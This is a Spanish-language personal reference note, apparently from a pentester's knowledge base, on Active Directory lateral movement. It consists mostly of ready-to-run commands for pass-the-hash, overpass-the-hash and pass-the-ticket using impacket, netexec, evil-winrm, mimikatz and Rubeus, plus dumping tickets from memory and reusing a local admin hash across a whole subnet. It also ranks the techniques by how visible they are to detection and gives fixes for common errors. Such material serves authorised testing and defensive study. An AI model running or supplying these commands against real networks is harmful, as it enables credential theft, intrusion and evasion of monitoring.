---
tipo: meta
aliases:
  - Movimiento lateral
  - impacket
  - netexec
  - evil-winrm
tags:
  - meta/referencia
  - dominio/ad
---

# AD movimiento lateral - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cómo se convierte material de autenticación en ejecución en otra máquina. El criterio está en [[Pass-the-hash]] y [[Pass-the-ticket]].

## 0. Qué tengo y qué protocolo me habilita

El material decide el protocolo, y el protocolo decide el ruido.

| Tengo | Puedo | Protocolo |
|---|---|---|
| Contraseña en claro | Todo | NTLM y Kerberos |
| Hash NT | [[Pass-the-hash]], overpass-the-hash | **NTLM**, o Kerberos si primero pido un TGT |
| Ticket `.kirbi` / `.ccache` | [[Pass-the-ticket]] | Kerberos únicamente |
| Clave AES-256 | Pass-the-key | Kerberos, y sobrevive donde RC4 está apagado |

> [!warning] El hash arrastra NTLM, y NTLM se ve
> Un dominio que usa Kerberos para todo y de golpe registra una autenticación NTLM contra un recurso es exactamente [[Autenticación NTLM donde el dominio usa Kerberos]]. Overpass-the-hash existe para eso: convierte el hash en un TGT y el resto del movimiento pasa por Kerberos, que es el tráfico normal del dominio.

## 1. Pass-the-hash

`nxc smb 10.0.0.20 -u Administrador -H 31d6cfe0d16ae931b73c59d7e0c089c0`
Comprobar dónde vale ese hash. `(Pwn3d!)` en la salida significa admin local.

`psexec.py dominio.local/Administrador@10.0.0.20 -hashes :31d6c...`
`wmiexec.py dominio.local/Administrador@10.0.0.20 -hashes :31d6c...`
`smbexec.py dominio.local/Administrador@10.0.0.20 -hashes :31d6c...`
`atexec.py dominio.local/Administrador@10.0.0.20 -hashes :31d6c... "whoami"`

`evil-winrm -i 10.0.0.20 -u Administrador -H 31d6c...`

`mimikatz # sekurlsa::pth /user:Administrador /domain:dominio.local /ntlm:31d6c... /run:cmd.exe`

El `:` antes del hash no es adorno: el formato es `LM:NT` y el LM va vacío.

| Método | Cómo ejecuta | Ruido |
|---|---|---|
| `psexec` | Sube un binario y crea un **servicio** | El más ruidoso. Servicio nuevo + archivo en `ADMIN$` |
| `smbexec` | Servicio por comando, sin subir binario | Menos archivo, mismo servicio |
| `wmiexec` | WMI, sin servicio ni archivo | El más limpio de los tres. Semi-interactivo |
| `atexec` | Tarea programada | Un comando por vez |
| `evil-winrm` | WinRM en el 5985 | Tráfico administrativo legítimo. El más discreto si WinRM ya se usa |

WinRM es el que menos se distingue porque es el que los administradores usan de verdad. `psexec` es el que toda detección de Windows conoce.

## 2. Overpass-the-hash — del hash a Kerberos

`getTGT.py dominio.local/usuario -hashes :31d6c...`
`export KRB5CCNAME=usuario.ccache`
`psexec.py -k -no-pass dominio.local/usuario@objetivo.dominio.local`

`Rubeus.exe asktgt /user:usuario /rc4:31d6c... /ptt`

Con `-k` Impacket usa Kerberos. **Hay que apuntar al nombre, no a la IP**: Kerberos resuelve por SPN y una IP no tiene SPN.

## 3. Pass-the-ticket

`export KRB5CCNAME=/ruta/ticket.ccache`
`klist`
`psexec.py -k -no-pass dominio.local/usuario@objetivo.dominio.local`

`mimikatz # kerberos::ptt ticket.kirbi`
`Rubeus.exe ptt /ticket:ticket.kirbi`

`Rubeus.exe dump /nowrap`
Tickets que ya están en memoria de la máquina actual. Con admin local salen los de **todas** las sesiones, no solo la propia.

Conversión entre formatos:

`ticketConverter.py ticket.kirbi ticket.ccache`
`ticketConverter.py ticket.ccache ticket.kirbi`

`.kirbi` es el formato de Windows y `.ccache` el de Linux. La conversión es el paso que más veces se olvida al saltar de una máquina Windows a la de ataque.

## 4. Ejecución remota sin credenciales nuevas

`nxc smb 10.0.0.0/24 -u user -H hash --local-auth`
Reutiliza el hash del administrador local contra toda la red. Cuando la contraseña del administrador local es la misma en todas las máquinas —que es lo normal sin LAPS— esto sola resuelve el movimiento lateral entero.

`nxc smb 10.0.0.20 -u user -p 'pass' -x 'whoami'`
`nxc smb 10.0.0.20 -u user -p 'pass' -X 'Get-Process'`

`nxc winrm 10.0.0.20 -u user -p 'pass'`
`nxc mssql 10.0.0.20 -u user -p 'pass' -q 'SELECT @@version'`

## 5. Delegación de credenciales — el problema del doble salto

Una sesión de WinRM o PowerShell remoto **no puede** usar tus credenciales para saltar a una tercera máquina: el ticket no se reenvía. Se ve como un `Access denied` que no tiene sentido porque la cuenta sí tiene permiso.

Tres salidas, en orden de preferencia:

1. Inyectar el ticket en la sesión remota con `Rubeus ptt`.
2. Volver a autenticarse dentro de la sesión con credenciales explícitas.
3. `-k` con un `.ccache` propio en lugar de heredar el contexto.

## 6. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `STATUS_LOGON_FAILURE` | Hash o usuario mal. Verificar que el formato sea `:NT`, sin la parte LM |
| `STATUS_ACCESS_DENIED` con credencial válida | La cuenta no es admin local en ese objetivo. El hash sirve, la máquina no |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` con `-k` | Apuntaste a una IP. Kerberos necesita el nombre completo |
| `Clock skew too great` | Más de cinco minutos con el DC |
| `SessionError: STATUS_OBJECT_NAME_NOT_FOUND` | Falta el recurso `ADMIN$` o `C$`. `psexec` no funciona sin eso |
| El ticket no se usa y sigue pidiendo contraseña | `KRB5CCNAME` mal exportado, o el `.kirbi` no se convirtió a `.ccache` |
| Filtro de UAC en cuentas locales | Solo el `Administrador` real (RID 500) tiene privilegio completo en remoto. Las otras cuentas locales van filtradas |
| `Access denied` desde una sesión remota hacia una tercera máquina | El doble salto. Ver arriba |

## Relacionadas

[[MOC - Active Directory]] · [[Pass-the-hash]] · [[Pass-the-ticket]] · [[AD volcado de credenciales - matriz de referencia]] · [[Windows 4624 - Successful logon]]
